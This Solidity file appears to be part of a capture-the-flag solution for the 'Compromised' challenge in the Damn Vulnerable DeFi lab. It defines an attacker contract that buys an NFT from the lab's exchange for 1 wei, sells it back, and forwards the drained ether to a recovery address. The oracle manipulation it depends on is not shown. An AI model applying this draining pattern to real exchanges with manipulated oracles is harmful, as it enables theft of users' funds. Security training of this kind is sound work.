// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";

contract CompromisedAttacker is IERC721Receiver {
    uint256 private nftId;
    address private recovery;

    DamnValuableNFT private nft;
    Exchange private exchange;
    TrustfulOracle private oracle;

    constructor(
        address _recovery,
        address _nft,
        address _oracle,
        address _exchange
    ) payable {
        recovery = _recovery;
        nft = DamnValuableNFT(_nft);
        oracle = TrustfulOracle(_oracle);
        exchange = Exchange(payable(_exchange));
    }

    receive() external payable {}

    function buy() external payable {
        nftId = exchange.buyOne{value: 1}();
    }

    function sell() external {
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    function recover(uint256 amount) external {
        (bool success, ) = payable(recovery).call{value: amount}("");
        require(success, "Recovery is not successful");
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
